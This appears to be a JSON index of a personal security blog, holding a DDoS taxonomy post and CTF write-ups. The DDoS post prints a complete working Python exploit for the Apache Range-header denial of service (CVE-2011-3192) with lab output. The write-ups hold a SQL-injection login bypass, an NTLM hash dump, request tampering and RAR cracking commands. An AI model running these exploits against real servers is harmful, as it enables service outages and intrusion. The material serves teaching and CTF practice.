
            
        
        
        
        
            
        
        
            
        
        
            
        
        
            
        
        
            
        
        
            
        
        
        
        
        
        
        
        
        
        
        
        
        
        [{"categories":[],"content":"This project is about a Telegram bot with the ability to execute terminal commands from your Telegram account and with the command response as messages.\nInitially, I started this project for personal needs, but I decided to release it because of the sure need of many with the same problem. I encountered and based in a project of Va5c0 .\nIt often happens in a pentest or even more a bug bounty, that you need to enumerate targets or processes that take a lot of time as certain types of nmap scans, cracking some hash. And many times for that reason I leave that process working, checking if it is finished or not, leaving the computer on, sometimes with nothing else to do, sometimes I had to leave and turn off the computer leaving all the previous process without results. It is a high cost of time and money.\nSo now I share this little project of a bot (which I baptized as Bot Bounty) that can be used by a single person or several, as a company with this same need to improve productivity. Either on a computer, VPS, or a Raspberry. Keeping the degree of security that no one but the people who are authorized to use the bot will use it (in case someone external comes across the bot and try to use it).\nThe bot has predefined options for quick access to information that can be useful for bot usage. To mention a few: the available RAM space (info serv/RAM option), or the public IP of the device on which the bot is running.\nIn addition, with the command /exec you can execute any command that is available in our terminal of the device to use, for example:\nThus limiting itself to commands that require interaction, such as some unforced installation with the typical -y or logging in via SSH, to name a few examples.\nFor example, in amass, the command is /amassenum, which calls $ amass enum -d to perform an enumeration of subdomains:\nIn nmap we have a scan with the scripts, by default, pull out the port versions found, avoid performing host discovery (check if it is alive), and search all possible ports; i.e.: $ nmap -sC -sV -Pn -p-.\nOf course, to use these commands, the tools must be installed in the system you are using to run the bot (and you can call them directly in the console).\nAs a first release, we only have these commands; however, I am waiting for other shortcut commands to add to the bot that you suggest. Also, if you find bugs, you can write to me or issue an issue in the repository.\nThe repository is as follows: Bot Bounty Pre-configurations To use it previously you must create a bot in Telegram and replace the API KEY that gives by the value specified in the script at line 12.\nTOKEN = \u0026#39;XXXXXX:XXXXXXXXXXXXXXXXXXXXXXXX\u0026#39;. In addition to register the user ID(s) that will use the bot, in line 14:\nauthorizedUsers = [123456789, 987654321] And now just run the script.\n$ python3 bot.py Tips **If the command\u0026rsquo;s output is too big, you should save it in a file and without output **.\nfor example:\nnmapadv example.com \u0026gt; resultsExample.txt nmapadv example.com -oN resultsExample.txt exec echo 'awesome bot!' \u0026gt; yesItIs.txt To check for possible unauthorized users trying to use the bot, a log of all executed commands with user details is kept in the file logFileBot.txt.\nAnd that would be it, for now; I hope this work is well received.\n-Hackers are People Too üòú\n","permalink":"http://localhost/post/bot-bounty-telegram-bot/","tags":[{"LinkTitle":"Bot","RelPermalink":"/tags/bot/"},{"LinkTitle":"Featured","RelPermalink":"/tags/featured/"},{"LinkTitle":"Bug Bounty","RelPermalink":"/tags/bug-bounty/"},{"LinkTitle":"Pentest","RelPermalink":"/tags/pentest/"},{"LinkTitle":"Tool","RelPermalink":"/tags/tool/"}],"title":"Bot Bounty, a bot for Pentesting \u0026 Bug Bounty"},{"categories":[],"content":"I\u0026rsquo;ve been into cybersecurity for over for over 10 years, driven by the belief that improving information security isn\u0026rsquo;t a cost ‚Äî it\u0026rsquo;s an essential investment for any society.\nCurrently, I‚Äôm a cybersecurity consultant at a Swiss company, where I focus on red teaming, offensive and defensive security assessments, and incident response for companies, banks, and critical infrastructure.\nOver the years, I‚Äôve had the chance to be a speaker, trainer, and mentor at various events and organizations. I‚Äôve also received multiple awards and recognitions in bug bounty programs and other cybersecurity areas.\nI hold professional certifications and specialized training from institutions like INE, EC-COUNCIL, Google, and CISCO. I also contribute voluntarily by helping assess the security of government websites.\nMy expertise lies in Web Security Testing and Penetration Testing. I‚Äôve built custom tools and led projects with a practical, results-driven approach to information security.\nIf you think I can help you out or you\u0026rsquo;d like to collaborate on something security-related, feel free to message me on social media ‚Äî just tell me what you need.\nAnd if you enjoy my work or want to support what I do, you can always Buy Me a Beer! üç∫üòâ\n","permalink":"http://localhost/about/","tags":[],"title":"About Drayko"},{"categories":[],"content":"Desde hace m√°s de 10 a√±os me dedico al mundo de la ciberseguridad, con la convicci√≥n de que mejorar la seguridad inform√°tica no es un gasto, sino una inversi√≥n necesaria para cualquier sociedad.\nActualmente, trabajo como consultor en ciberseguridad en una empresa suiza, realizando ejercicios de red teaming, an√°lisis ofensivo y defensivo, as√≠ como respuesta a incidentes para empresas, entidades bancarias y organizaciones cr√≠ticas.\nHe sido expositor, entrenador y mentor en diversos eventos y organizaciones, y a lo largo de mi trayectoria he recibido premios y reconocimientos en programas de bug bounty y otras √°reas de la ciberseguridad.\nCuento con certificaciones profesionales y formaci√≥n especializada de instituciones como INE, EC-COUNCIL, Google y CISCO. Adem√°s, colaboro de forma voluntaria analizando la seguridad de sitios web estatales.\nSoy especialista en Web Security Testing y Penetration Testing. He desarrollado herramientas propias y liderado proyectos enfocados en la seguridad de la informaci√≥n, siempre con una visi√≥n pr√°ctica y orientada a resultados.\nSi crees que puedo ayudarte o colaborar contigo en algo relacionado con seguridad inform√°tica, no dudes en escribirme por redes. ¬°Contame directamente qu√© necesitas!\nY si te gusta lo que hago o quieres apoyarme, puedes invitarme una cerveza en el bot√≥n de Buy Me a Beer! üç∫üòâ\n","permalink":"http://localhost/about.es/","tags":[],"title":"Acerca de"},{"categories":[],"content":"This post arose from a university job (for a Raspberry); however, it served me with other similar needs, to connect remotely without opening ports on the router.\nTo achieve an SSH connection (or another protocol) outside the local area, in a simple way, it seems this, for different reasons (it could be by enabling ports on the router, only that this according to the operator can become very difficult to achieve due to your policies among other things), then let\u0026rsquo;s continue, you need to install Ngrok In the case of a Raspberry you need the version Linux(ARM) or in console:\nwget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip Then the unzip is done as explained in the ngrok console tutorial:\nunzip ngrok-stable-linux-arm.zip The next thing is to register and/or enter ngrok, and once there, go to this link where it will show the token for your account\nOnce knowing your token you have to execute on your device:\n./ngrok authtoken XXXXXHereYourTokenXXXXXXX With that it should be configured, all that remains is to listen to port 22, which is used by SSH, as follows:\n./ngrok tcp 22 it is then when it shows them the Host and port it will point This shows at Forwarding the TCP address and port that enables us to work with our Raspberry.\nIn this case, it was 0.tcp.ngrok.io and port 17271, that is, instead of our local IP and default port (22), these must be specified to access our device outside the local area, that is:\nssh pi@0.tcp.ngrok.io -p17271 and that would be :D On the ngrok page you can review the variety and protocols available, with the same logic.\n-Hackers are People Too üòú\n","permalink":"http://localhost/post/ssh-connection-outside-the-local-network/","tags":[{"LinkTitle":"Redes","RelPermalink":"/tags/redes/"},{"LinkTitle":"SSH","RelPermalink":"/tags/ssh/"},{"LinkTitle":"Network","RelPermalink":"/tags/network/"},{"LinkTitle":"Ngrok","RelPermalink":"/tags/ngrok/"}],"title":"SSH connection outside the local network"},{"categories":[],"content":" A Distributed Denial of Service (DDoS) attack is carried out by generating a large flow of information from multiple connection points towards a single destination. In this post, two types of taxonomies will be presented to classify them by attacks and countermeasures, highlighting similarities, characteristics, and strategies with the aim of designing appropriate measures.\nIntroduction\nThe development and use of DDoS attack techniques have increased over time, and attackers constantly modify their approaches. This study aims to cover both well-known attacks and potential modifications, divided by levels.\nGeneral Aspects\nWhat makes DDoS attacks possible?\nDue to the design of the Internet following an end-to-end paradigm, in a two-way communication there is no intermediary that can immediately control or stop the transmission of malicious packets. Additionally, the possibility of performing IP Spoofing further complicates controlling these attacks without affecting genuine clients of the victim host.\nHow are DDoS attacks carried out?\nTo begin, they consist of several phases. Usually, automated scanning is used to identify devices that may be vulnerable‚Äîin simple terms, this is the start of the recruitment process. Once identified, these devices are exploited or infected (typically automatically) to introduce malicious code, which will later be used to recruit even more devices. I would call this a pyramid scheme.\nWhy are DDoS attacks carried out?\nThey are usually executed for personal reasons (revenge) or reputation (to gain respect and fame). However, they are also carried out for economic reasons (to harm a competitor) and political reasons (such as a war that could leave an entire country without internet services‚Äîan issue that Russia recently considered and is working on by improving its internet independence and implementing countermeasures).\nTaxonomy of DDoS Attacks\nDA: Degree of Automation (Grado de automatizaci√≥n)\nDA-1 Manual\nThe previously mentioned phases of scanning and exploitation are carried out entirely manually by the attacker.\nDA-2 Semi-Automatic\n\u0026hellip;\nTaxonomy of DDoS Defense Mechanisms\nFor more details on each classification, refer to this article .\nDemo Time | CVE-2011-3192 To provide a practical example of a DDoS attack, consider the case study of the so-called ApacheKiller attack. This attack allows adversaries to cause a denial of service (through memory and CPU consumption) by exploiting the Range header that specifies multiple overlapping ranges, and it is assigned the identifier CVE-2011-3192.\nAffected versions of Apache HTTP Server include 1.3.x, 2.0.x up to 2.0.64, and 2.2.x up to 2.2.19. In my case, I used Windows 7 as the victim host running Apache v2.2.15 along with a Python script to execute the attack.\nStep 1\nInstall and run a vulnerable version of Apache as described above. Step 2\nPerform a brief test so you can closely observe the request, which also reveals the version of Apache in use. In a paid test or bug bounty scenario, this information could be very useful. Step 3\nUsing the Python script created by Miroslav Stampar, we perform the test:\n#!/usr/bin/env python import optparse, os, re, socket, threading, time, urllib, urllib2, urlparse NAME = \u0026#34;KillApachePy (Range Header DoS CVE-2011-3192)\u0026#34; VERSION = \u0026#34;0.1c\u0026#34; AUTHOR = \u0026#34;Miroslav Stampar (@stamparm)\u0026#34; LICENSE = \u0026#34;Public domain (FREE)\u0026#34; SHORT = \u0026#34;You\u0026#39;ll typically have to wait for 10-20 iterations before first connection timeouts. More complex/bigger the page the better\u0026#34; REFERENCE = \u0026#34;http://seclists.org/fulldisclosure/2011/Aug/175\u0026#34; SLEEP_TIME = 3 # time to wait for new thread slots (after max number reached) RANGE_NUMBER = 1024 # number of range subitems forming the DoS payload USER_AGENT = \u0026#34;KillApachePy (%s)\u0026#34; % VERSION def attack(url, user_agent=None, method=\u0026#39;GET\u0026#39;, proxy=None): if \u0026#39;://\u0026#39; not in url: url = \u0026#34;http://%s\u0026#34; % url host = urlparse.urlparse(url).netloc user_agent = user_agent or USER_AGENT if proxy and not re.match(\u0026#39;\\Ahttp(s)?://[^:]+:[0-9]+(/)?\\Z\u0026#39;, proxy, re.I): print \u0026#34;(x) Invalid proxy address used\u0026#34; exit(-1) proxy_support = urllib2.ProxyHandler({\u0026#39;http\u0026#39;: proxy} if proxy else {}) opener = urllib2.build_opener(proxy_support) urllib2.install_opener(opener) class _MethodRequest(urllib2.Request): \u0026#39;\u0026#39;\u0026#39; Create any HTTP (e.g. HEAD/PUT/DELETE) request type with urllib2 \u0026#39;\u0026#39;\u0026#39; def set_method(self, method): self.method = method.upper() def get_method(self): return getattr(self, \u0026#39;method\u0026#39;, urllib2.Request.get_method(self)) def _send(check=False): \u0026#39;\u0026#39;\u0026#39; Send the vulnerable request to the target \u0026#39;\u0026#39;\u0026#39; if check: print \u0026#34;(i) Checking target for vulnerability...\u0026#34; payload = \u0026#34;bytes=0-,%s\u0026#34; % \u0026#34;,\u0026#34;.join(\u0026#34;5-%d\u0026#34; % item for item in xrange(1, RANGE_NUMBER)) try: headers = { \u0026#39;Host\u0026#39;: host, \u0026#39;User-Agent\u0026#39;: USER_AGENT, \u0026#39;Range\u0026#39;: payload, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39; } req = _MethodRequest(url, None, headers) req.set_method(method) response = urllib2.urlopen(req) if check: return response and (\u0026#39;byteranges\u0026#39; in repr(response.headers.headers) or response.code == 206) except urllib2.URLError, msg: if \u0026#39;timed out\u0026#39; in str(msg): print \u0026#34;\\r(i) Server seems to be choked (\u0026#39;%s\u0026#39;)\u0026#34; % msg else: print \u0026#34;(x) Connection error (\u0026#39;%s\u0026#39;)\u0026#34; % msg if check or \u0026#39;Forbidden\u0026#39; in str(msg): os._exit(-1) except Exception, msg: raise try: if not _send(check=True): print \u0026#34;(x) Target does not seem to be vulnerable\u0026#34; else: print \u0026#34;(o) Target seems to be vulnerable\\n\u0026#34; quit = False while not quit: threads = [] print \u0026#34;(i) Creating new threads...\u0026#34; try: while True: thread = threading.Thread(target=_send) thread.start() threads.append(thread) except KeyboardInterrupt: quit = True raise except Exception, msg: if \u0026#39;new thread\u0026#39; in str(msg): print \u0026#34;(i) Maximum number of new threads created (%d)\u0026#34; % len(threads) else: print \u0026#34;(x) Exception occured (\u0026#39;%s\u0026#39;)\u0026#34; % msg finally: if not quit: print \u0026#34;(o) Waiting for %d seconds to acquire new threads\u0026#34; % SLEEP_TIME time.sleep(SLEEP_TIME) print except KeyboardInterrupt: print \u0026#34;\\r(x) Ctrl-C was pressed\u0026#34; os._exit(1) def main(): print \u0026#34;%s #v%s\\n by: %s\\n\\n(Note(s): %s)\\n\u0026#34; % (NAME, VERSION, AUTHOR, SHORT) parser = optparse.OptionParser(version=VERSION) parser.add_option(\u0026#34;-u\u0026#34;, dest=\u0026#34;url\u0026#34;, help=\u0026#34;Target url (e.g. \\\u0026#34;http://www.target.com/index.php\\\u0026#34;)\u0026#34;) parser.add_option(\u0026#34;--agent\u0026#34;, dest=\u0026#34;agent\u0026#34;, help=\u0026#34;User agent (e.g. \\\u0026#34;Mozilla/5.0 (Linux)\\\u0026#34;)\u0026#34;) parser.add_option(\u0026#34;--method\u0026#34;, dest=\u0026#34;method\u0026#34;, default=\u0026#39;GET\u0026#39;, help=\u0026#34;HTTP method used (default: GET)\u0026#34;) parser.add_option(\u0026#34;--proxy\u0026#34;, dest=\u0026#34;proxy\u0026#34;, help=\u0026#34;Proxy (e.g. \\\u0026#34;http://127.0.0.1:8118\\\u0026#34;)\u0026#34;) options, _ = parser.parse_args() if options.url: result = attack(options.url, options.agent, options.method, options.proxy) else: parser.print_help() if __name__ == \u0026#34;__main__\u0026#34;: main() And configuring it with the Burp Suite proxy, the terminal output would look something like this:\nroot@lab:~# python Apachekiller.py -u 192.168.100.58 --proxy=\u0026#34;http://127.0.0.1:8080\u0026#34; KillApachePy (Range Header DoS CVE-2011-3192) #v0.1c by: Miroslav Stampar (@stamparm) (Note(s): You\u0026#39;ll typically have to wait for 10-20 iterations before first connection timeouts. More complex/bigger the page the better) (i) Checking target for vulnerability... (o) Target seems to be vulnerable (1) Creating new threads Once executed, let\u0026rsquo;s check our server: As you can see, the CPU usage is maxed out, which demonstrates the vulnerability these Apache versions have. However, let\u0026rsquo;s analyze the requests that were sent. As you can see, requests are sent with overlapping ranges, causing our server to process all this data for an extended period (thus consuming resources), which, on a larger scale, can be fatal. Thus, this is an example of a DoS attack that managed to achieve 100% CPU usage. With a simultaneous attack from multiple machines (a DDoS attack), it could potentially crash the server (resulting in a blue screen).\nThis would be an example in our taxonomy of an EW-1 (Exploited Weakness to Deny Services: Semantic), as the attack exploits a bug present in these versions of Apache.\nA solution to this problem would be to update the server and/or apply patches if available, as well as implement a WAF like modSecurity. Therefore, the taxonomy for our DDoS defense mechanism would be AL-1:PG-1:ST-1 (Activity Level: Preventive - Prevention Goal: Attack Prevention - Secured Target: System Security).\nThat‚Äôs it‚Äîif you have any questions, feel free to reach out.\n-Hackers are People Too üòú\n","permalink":"http://localhost/post/taxonomy-of-ddos/","tags":[{"LinkTitle":"Networks","RelPermalink":"/tags/networks/"},{"LinkTitle":"Curiosities","RelPermalink":"/tags/curiosities/"},{"LinkTitle":"Network","RelPermalink":"/tags/network/"},{"LinkTitle":"Paper","RelPermalink":"/tags/paper/"}],"title":"Taxonomy of DDoS Attacks and DDoS Defense Mechanisms"},{"categories":[],"content":"Although this post is not something technical as usual, I find it quite interesting about the first computer in Bolivia.\nSomeone sent on the mailing list of the Free Software Community of Bolivia a link to a post in medium . Where some of the documented articles about the first computers in each country were listed, and discovering that Bolivia was on that list was interesting (the paper is among the ACM library).\nThe first computer, according to this article, is a IBM 1440 (as seen in the image), which the Bolivian Mining Corporation acquired (COMIBOL).\nThe article was published in 1969. It explains that the department created to use the machine had already been in operation for 3.5 years. So I deduce that the computer arrived in 1965 or 1966 (if anyone could confirm this, it would be incredible).\nHowever, the complicated thing at the beginning, as in almost any new equipment, was to find trained workers to use this machine. That was available for the accounting processes of the corporation, something that questioned the usefulness given the cost of the computer. So aptitude tests were made for its management, where 500 people applied, but only six passed. They sent these staff to be trained in COBOL and FORTRAN IV to do the data processing.\nAlthough it was a tremendous technological advance, there were still doubts about it and being criticized because the previous staff who carried out this accounting work by hand had to be practically fired.\nThe cost of technological advancement for specific jobs or careers continues to be devastating to this day due to the automation of processes and even more so when using \u0026ldquo;Artificial Intelligence\u0026rdquo; is already seen in so many areas that the human seems unnecessary.\nHowever, it is not the end of the road for everyone; it is the law of life and nature that the strongest or the one who adapts the fastest survives. In this case, being hand in hand with technology, you don\u0026rsquo;t have to give up.\n-Hackers are People Too\n","permalink":"http://localhost/post/the-first-computer-in-bolivia/","tags":[{"LinkTitle":"Curiosities","RelPermalink":"/tags/curiosities/"},{"LinkTitle":"Fun Facts","RelPermalink":"/tags/fun-facts/"}],"title":"The first computer in Bolivia"},{"categories":[],"content":"This CTF was composed of 74 teams from universities convened nationally for undergraduate and graduate level at the International Congress Of Computer Security (CIDSI in Spanish) which was organized by the Agency of Electronic Government and Information and Communication Technologies (AGETIC in Spanish). Thanks to the efforts of the Computer Incident Management Center(CGII) held from November 29 to December 1, 2018.\nFinishing this series, and as I mentioned in the previous post , in this one we participated in Team as Dark Army with Israel , Rafael and my person , accomplishing to solve all the challenges; However we could not recover all the statements or the specific flags(As they were written in literal form in the event), but they are explained as we solved it in the CTF, which lasted two half days.\nLevel 1 1.1. Traffic Analysis 1 Welcome. A company dedicated to banking has just hired you to perform traffic analysis. The problem is that there is an employee who is leaking email addresses, at the same time another employee started to pass passwords that have privileges to modify the salaries of employees. Your mission is to find that password.\nWell, to begin with, they give us a traffic capture , in which when we search with Wireshark we find a request with the username and password.\nthen the flag is:\n007 1.2 Web crawlers Unfortunately search engines are indexing many pages of this website that are confidential to us! Do you know which file prevents this from happening? Nobody wants fully indexed sites right?\nThis is quite easy, the Flag is inside the robots.txt , which provides information to the search engine crawlers about the pages or files that they can request or not from your website.\nhttp://url/robots.txt 1.3 Backups Petr√≥leos del Caribe asked us to save a backup of its main jsp file. Unfortunately, the engineer in charge went to a plant in the middle of the sea and he can\u0026rsquo;t tell us the extension with which he saved them. The supply manager requires the backup urgently, can you help me identify which file it is in? Do it soon my position is at stake. Remember that the most common backup extensions are:\nbak old bakup save In this one we had to be somewhat observant, as much in the track as in what we have in front of us, it tells us the main jsp, which would come to mean the index.jsp in addition that the current page is http://url/index.jsp.\nSo trying with the extensions that they suggest us, it is possible to arrive to the answer\nhttp://url/index.jsp.bakup Which contains\n\u0026lt;%@ page contentType=\u0026#34;text/html; charset=UTF-8\u0026#34; pageEncoding=\u0026#34;UTF-8\u0026#34; language=\u0026#34;java\u0026#34; import=\u0026#34;java.sql.*,java.io.*,java.net.*,org.owasp.encoder.Encode, dbProcs.*, utils.*\u0026#34; errorPage=\u0026#34;\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Locale\u0026#34;%\u0026gt; \u0026lt;%@ include file=\u0026#34;translation.jsp\u0026#34; %\u0026gt; \u0026lt;% ShepherdLogManager.logEvent(request.getRemoteAddr(), request.getHeader(\u0026#34;X-Forwarded-For\u0026#34;), \u0026#34;DEBUG: index.jsp *************************\u0026#34;); Locale lang = new Locale(Validate.validateLanguage(request.getSession())); /** The flag/flag is: 402051f4be0cc3aad33bcf3ac3d6532b. */ %\u0026gt; then that\u0026rsquo;s where we get the flag\n402051f4be0cc3aad33bcf3ac3d6532b 1.4 Programmer program One of your friends left you a clue in java code development, but you must solve a mathematical puzzle before you can find the result. The flag is the key to enter his system (the smallest number you can find). But this is easy for you, they are not differential equations.\ngive us a java file\npackage exploit; import java.util.Scanner; public class KeithLikesToTroll { public static void main(String[] args){ int clave; Scanner scn = new Scanner(System.in); System.out.print(\u0026#34;Introdusca la llave: \u0026#34;); clave = scn.nextInt(); scn.close(); if(1338557220 / clave * clave != 1338557220 \u0026amp;\u0026amp; clave \u0026gt; 0){ System.out.println(\u0026#34;Autenticacion correcta. La bandera es un n√∫mero peque√±o que te dejara entrar.\u0026#34;); }else{ System.out.println(\u0026#34;Autenticacion incorrecta.\u0026#34;); } } } Which should be compiled and executed in such a way that the lowest number of correct, with brute force can be reached quickly.\nThe Flag:\n8 1.5 Wifi admin panel We are on vacation in the Caribbean, unfortunately, because of your friend the flight has just left us and we are waiting for 5 long hours at the airport. Another one of your friends found out that they can access free internet at the airport but to do so you must log in to the router. Do you dare to try how to log in?\nFor this, we need to observe well, and the clue they give us is SMC Networks, which is a brand that produces Routers among other things, which with a little search we have some combinations of Users and Passwords by default which we try to find the correct and get the flag\nLevel 2 2.1 Steganography Did you know that the technique of hiding messages or objects inside images so that their existence is not perceived is steganography. We love this technique. So I will leave this image here and go very slowly.\nimage to download This at first puzzled us, however, the solution is to extract each printable string in the image, using strings from console(on Linux) strings 8c373fd1a.jpeg And the Flag:\n1e5b77443345620c52d23c73dc87521c 2.2 Forensics A dangerous criminal is passing hidden messages in pdfs sent by his accomplice abroad. You can do an analysis, you\u0026rsquo;re almost a hacker. Did you find your flag? Download document In this case, parsing the metadata gives us the spoils; With the use of Exiftool :\nexiftool CIDSI2018.pdf And the Flag:\nc47d187067c6cf9 2.3 SQL Injection We know that the coyote buys all his artifacts from ACME, can you help us display all the tuples in the table to find the trap with which he finally catches his nemesis?\nWhen I saw this one I thought it would take a while, however when I tried any injection a copy of the query I made appeared at the top, very Bricks style. So finding the solution was very quick with a typical bypass injection.\n\u0026#39;)or(\u0026#39;1\u0026#39;)=(\u0026#39;1 Which gave us the Flag.\n2.4 Reverse Engineering One of the biggest dangers in mobile applications is reverse engineering. Because we can inspect the source code and find API keys, passwords, etc. We found an apk file while you were checking shared resources, luckily we saved it, now we want to know what it contains. There are several tools available to reverse engineer an APK file. Download APK As mentioned in the statement, there are several tools, I preferred to use Apktool apktool d reversing.apk which gives us a folder with everything extracted, in which you can do a quick search with grep user@pc:# grep \u0026#34;flag\u0026#34; . -R ./reversing/smali/com/mobshep/reverseengineer/Reverse_Engineering.smali: const-string v0, \u0026#34;The flag/flag is 9yfdsj3md0lq75\u0026#34; and the Flag!\n9yfdsj3md0lq75 Level 3 3.1 Traffic analysis 2. We are performing a traffic analysis because we detected that someone is leaking confidential information and the amount of information is so large that they compressed it with password protection, but finding the password is easy for you. Help us to find the password that will help us to access our flag. Download capture Finding the zip was not difficult, we only had to export it with Export Packet Bytes or exporting all the objects. Once arrived at this point the zip that we obtain is protected with a password as mentioned in the statement, for that, we had to observe the capture\nthe zip password\nazulcrema and the flag!\nIW{HTTP_BASIC_AUTH_IS_EASY} 3.2 User list A group of users decided to complain because there is no coffee, can you believe it. And one of the users seems to be the one stealing the coffee, of course, he hid himself from the list. Help me find him and bring back the coffee to our lives.\nIn this one it took me a while to realize, we were given a choice between consulting the information of 5 users, however, there was not something relevant among them, I tried to search by inspecting the elements, and the requests, however, the clue was in how the requests were made.\nPOST /challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646e0f313a4 HTTP/1.1 Host: 192.168.3.100 Accept: ** Accept-Language: en-US,en:q-0.5 Accept-Encoding: gzip, deflate Referer: https://192.168.3.100/challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646eOf313a4.jsp Content-Type: application/X-WWW-form-urlencoded X-Requested-With: XMLHttpRequest Content-Length: 45 Connection: close userId%5B%5D=cfcd208495d565ef66e7dff9f98764da The request was identified this way: cfcd208495d565ef66e7dff9f98764da, which when verified was an MD5 and in plain text value 0:\ncfcd208495d565ef66e7dff9f98764da = 0 When checking the others, they worked the same way, so I generated a list of MD5 hashed numbers to make requests until I found the hidden user, which was no more than the number 20.\n3.3 HASHDUMP Find the admin password\nsistemas:500:9E689B23C4D33D88E4C560258374B547:7E058F739B8A1E67C00815FC1E5E0E25::: Guest:501:NO PASSWORD*********************:NO PASSWORD*********************::: nonadmin:1005:NO PASSWORD*********************:0CF3760C0B0EB9F570AACE7040DF6DB7::: contabilidad:1013:23AC1B85C36D31AAE45E0AE1804A24B0:DE6D8B1780A4F0714242AC53A6C2B2E8::: administrador:1014:CE9F401800DF01AFFF959C003A9671D0:A7B9ECDD64AA492E449E0A619FD16E4B::: gerencia:1015:4978646A5C99C2834D6A97A372D4BC83:C7994B298128024418AD0E9C5038570C::: We can see that it is a dump of the Windows (NTLM) hashes.\nThis one took a while to figure out the trick, at first glance one would think that the admin account would be the one with such a name or similar, however, the trick was in the RID . The 500 belongs to the administrator account created during the OS installation, although in this case it is called sistemas.\nThen we have 2 ways to find it by brute force/dictionary or to look for it, to save time better to look for it and so we have, the flag!\ncoldplay Level 4 4.1 Cracking rar The users of the insurance company SEGURITAS are driving the systems staff crazy with their famous changes. As if they were going to change the world. If you are clever you will be able to access the flag that is compressed and password protected A systems employee has a clue for you. His id from a popular social network is 0x5afa18273c14.\nDownload First the id must be converted from Hexadecimal, then we get: 100030193548308.\nNow in facebook, we look for the profile: https://www.facebook.com/100030193548308 in which we find pictures of the employee spreading critical information about the company like that for rar files the password must have a number of length 5, then the only thing left is to crack the rar with a dictionary with all the possibilities of 5 digits numerals with John The Ripper .\njohn --wordlist=six --format=rar5 hashrar hashrar is the file where the hash of the RAR is located, then, we have the password.\n60372 With this we can extract the flag inside the archive:\n8743b52063cd84097a65d1633f5c74f5 4.2 Website bank To complete this challenge you must create a bank account and transfer more than 10000 bs to it. When you have that amount in your bank account, simply log out and log in again to be rewarded with the flag.\nTo start with you have to register, and the platform gives us the possibility to transfer money to other accounts\nHowever intercepting the requests was insecure, similar to this:\naccountSource=4\u0026amp;accountDestination=2\u0026amp;amount=1200 so by modifying the request, we can reverse this\naccountSource=2\u0026amp;accountTarget=4\u0026amp;amount=1200 this way we transfer money to ourselves, here is the result:\nVoila!\n0738FF78AE98A11F579A70F3F98468097426D4652B32A5F978818FC9CCB66CE74371A28833CC1A52854697C734D66249DB8E9AAB67F024262436EC8220C9OF11 Level 5 5.1 Exploiting We are doing safe development, Your challenge is to change the flow of the program so that the hidden function executes. Once you succeed I will congratulate you on your success. The flag is the hexadecimal address of the function beat with the correct format (0x11223344) Download program For this one, we had to use IdaPro , and look for the address.\n0x080484BB And that would be it!\nHowever we could not take 1st place by six points, because those who solved a challenge first had extra points, but we were very happy with the great team we formed; being in 2nd place among so many teams.\nAny doubt, question, or complaint you can write me , I hope you liked the WriteUp.\n-Hackers are People Too üòú\nlinks of interest Full undergraduate/postgraduate standings, click here the challenges were the same for both grades\nTo view event information here series links CTF UMSS WriteUp WirteUp Demo CTF CTF CIDSI 2018 ","permalink":"http://localhost/post/writeup-cidsi18/","tags":[{"LinkTitle":"CTF","RelPermalink":"/tags/ctf/"},{"LinkTitle":"WriteUp","RelPermalink":"/tags/writeup/"},{"LinkTitle":"Featured","RelPermalink":"/tags/featured/"}],"title":"WriteUp CTF CIDSI 2018"},{"categories":[],"content":"This is the second part of the series of CTFs heading to CIDSI 2018. This time the CTF was held at the Universidad Mayor de San Sim√≥n (UMSS), a way of qualifying for those who would go to the event (CIDSI) representing our university.\nThis CTF was organized by the Scientific Society of Students of Systems and Informatics (SCESI -UMSS) with the support of the Headquarters of Careers of Informatics and Systems of the University Mayor of San Sim√≥n (UMSS). In addition to @crhystamil made the challenges, thank you very much for such good challenges!\nIt was hosted on the FBCTF platform , and we participated as a team as Dark Army with Israel , Rafael and my person , achieving 1st place, without further ado, let\u0026rsquo;s get started!\n1.- problema: ZmxhZ3tVTVNTX2VkdV9TY2VzaV9DdGZ9Cg==\nsolution: Something simple to start with, as we can see, the solution is in Base64\nThe flag is:\nflag{UMSS_edu_Scesi_Ctf} 2.- Be very observant and find the flag for this challenge.\nsolution: Well, in the problem it gives us a login: We could try more than one way to bypass the login, but first let\u0026rsquo;s review the source code, it shows us that the login is being verified with Javascript:\nvar _0x9045=[\u0026#34;\\x76\\x61\\x6C\\x75\\x65\u0026#34;,\u0026#34;\\x75\\x73\\x65\\x72\\x6E\\x61\\x6D\\x65\u0026#34;,\u0026#34;\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\u0026#34;,\u0026#34;\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\u0026#34;,\u0026#34;\\x45\\x48\\x43\u0026#34;,\u0026#34;\\x4D\\x33\\x52\\x6F\\x61\\x57\\x4D\\x30\\x62\\x46\\x39\\x6F\\x4E\\x47\\x4E\\x72\\x4D\\x57\\x35\\x6E\u0026#34;,\u0026#34;\\x46\\x4C\\x41\\x47\\x20\\x65\\x6E\\x63\\x6F\\x6E\\x74\\x72\\x61\\x64\\x61\\x21\\x21\\x2C\\x20\\x69\\x6E\\x67\\x72\\x65\\x73\\x61\\x20\\x65\\x6C\\x20\\x66\\x6C\\x61\\x67\\x20\\x65\\x6E\\x20\\x65\\x6C\\x20\\x66\\x6F\\x72\\x6D\\x61\\x74\\x6F\\x20\\x66\\x6C\\x61\\x67\\x7B\\x2E\\x2E\\x2E\\x2E\\x7D\u0026#34;,\u0026#34;\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\u0026#34;,\u0026#34;\\x69\\x6E\\x64\\x65\\x78\\x2E\\x68\\x74\\x6D\\x6C\u0026#34;,\u0026#34;\\x59\\x6F\\x75\\x20\\x68\\x61\\x76\\x65\\x20\\x6C\\x65\\x66\\x74\\x20\u0026#34;,\u0026#34;\\x20\\x61\\x74\\x74\\x65\\x6D\\x70\\x74\\x3B\u0026#34;,\u0026#34;\\x64\\x69\\x73\\x61\\x62\\x6C\\x65\\x64\u0026#34;,\u0026#34;\\x73\\x75\\x62\\x6D\\x69\\x74\u0026#34;];var attempt=3;function validate(){var _0xd22bx3=document[_0x9045[2]](_0x9045[1])[_0x9045[0]];var _0xd22bx4=document[_0x9045[2]](_0x9045[3])[_0x9045[0]];if(_0xd22bx3== _0x9045[4]\u0026amp;\u0026amp; _0xd22bx4== 